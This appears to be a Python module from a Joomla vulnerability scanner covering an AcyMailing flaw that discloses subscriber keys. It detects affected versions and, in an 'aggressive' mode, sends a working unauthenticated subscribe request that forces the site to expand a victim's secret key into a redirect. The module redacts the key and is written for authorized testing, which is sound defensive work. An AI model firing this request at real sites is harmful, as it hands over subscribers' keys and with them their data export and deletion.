from __future__ import annotations

import hashlib
import re
from typing import Any
from urllib.parse import urlencode

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-118495"
NAME = "AcyMailing subscriber key disclosure through subscription tags"
COMPONENT = "AcyMailing"
AFFECTED_RULE = "AcyMailing 6.0.0 through 11.1.1; fixed in 11.1.2"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
SUBSCRIBE_PATH = "/index.php"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY_PATTERN = re.compile(r"proofcms118495=([A-Za-z0-9_-]{16,64})")


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("11.1.2")
    first_affected = parse_version_safe("6.0.0")
    if parsed is None or fixed is None or first_affected is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < first_affected:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("acymailing", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="AcyMailing was not detected through its manifest or component route.", action="No action is required unless AcyMailing is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected AcyMailing {version}, within the affected range below 11.1.2. The public subscription response expands {{user:key}} in the redirect URL before checking that the request belongs to the subscriber."
        action = "Upgrade AcyMailing to 11.1.2 or newer and rotate subscriber keys after exposure."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected AcyMailing {version}, which restricts subscription tag expansion to name/email for identified subscribers and validates redirect targets."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "AcyMailing was detected, but its version could not be determined."
        action = "Determine the installed AcyMailing version and upgrade to 11.1.2 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _header(response: dict[str, Any], name: str) -> str:
    for key, value in (response.get("headers") or {}).items():
        if str(key).lower() == name.lower():
            return str(value)
    return ""


def _redact_key(location: str, key: str) -> str:
    if not key:
        return location
    return location.replace(key, "<redacted>")


def run_aggressive_probe(
    target_url: str,
    subscriber_email: str,
    expected_key: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Read a known subscriber's secret key from the public subscription redirect.

    AcyMailing 6.0.0-11.1.1 builds a ``{user:<property>}`` replacement map from
    the full subscriber record and applies it to the caller-supplied
    ``redirect`` URL. The public ``task=subscribe`` endpoint only needs the
    victim's e-mail address, so an unauthenticated request redirects to
    ``<attacker URL>?proofcms118495=<victim key>``. 11.1.2 limits the tags to
    name/e-mail for identified subscribers and validates the redirect target.

    The probe keeps the key on the target's own host: the redirect points back
    at ``/index.php`` and the client does not follow it, so the secret is read
    from the ``Location`` header without sending it anywhere.
    """
    base = normalize_url(target_url)
    redirect_url = f"{base}/index.php?proofcms118495={{user:key}}"
    query = urlencode(
        {
            "option": "com_acym",
            "ctrl": "frontusers",
            "task": "subscribe",
            "user[email]": subscriber_email,
            "redirect": redirect_url,
        }
    )
    url = f"{base}{SUBSCRIBE_PATH}?{query}"
    response = HttpClient(timeout=timeout, proxy=proxy).request(
        url,
        method="GET",
        headers={"User-Agent": BROWSER_UA},
        follow_redirects=False,
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The subscription request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    location = _header(response, "Location")
    match = KEY_PATTERN.search(location)
    key = match.group(1) if match else ""
    matches_expected = (key == expected_key) if expected_key else None
    leaked = bool(key) and matches_expected is not False
    evidence = {
        "subscriber_email": subscriber_email,
        "status": response.get("status"),
        "redirect_location": _redact_key(location, key),
        "leaked_key_length": len(key),
        "leaked_key_sha256_prefix": hashlib.sha256(key.encode()).hexdigest()[:12] if key else "",
        "key_matches_expected": matches_expected,
    }
    if leaked:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{SUBSCRIBE_PATH}",
            evidence=evidence,
            detail=(
                "An unauthenticated subscription request for a known e-mail address returned a redirect containing "
                "that subscriber's secret key. The key authorises the subscription-management, GDPR export and "
                "GDPR deletion endpoints. The key was kept on the target host and redacted from this report."
            ),
            action="Upgrade AcyMailing to 11.1.2 or newer and rotate the exposed subscriber keys.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{SUBSCRIBE_PATH}",
        evidence=evidence,
        detail=(
            "The subscription response did not expand {user:key} into the redirect. 11.1.2 only expands name/e-mail "
            "for identified subscribers, or the site requires login/captcha for public subscriptions."
        ),
        action="Upgrade affected AcyMailing versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_acym"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The AcyMailing page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The AcyMailing page is reachable; the subscriber-key disclosure payload was not sent in safe mode.", action="Use aggressive mode with a known subscriber e-mail on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because AcyMailing was not detected as potentially affected."
            return passive
        email = aggressive_value(aggressive_args, aggressive_command, "email") or aggressive_value(aggressive_args, aggressive_command, "subscriber_email")
        if not email:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="BLOCKED_EXTERNAL",
                confidence="MEDIUM",
                component=COMPONENT,
                component_version=passive.component_version,
                affected_rule=AFFECTED_RULE,
                exploit_available=True,
                exploit_ran=False,
                detail="Aggressive mode needs the e-mail address of an existing subscriber: --aggressive-arg email=<address>. No request was sent.",
                action="Provide a subscriber e-mail from the authorized staging site.",
            )
        result = run_aggressive_probe(
            target_url,
            subscriber_email=email,
            expected_key=aggressive_value(aggressive_args, aggressive_command, "expected_key"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (AcyMailing reachability) and aggressive (subscriber-key disclosure) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Information Disclosure", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["acymailing"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-118495", "https://www.acymailing.com/"]}
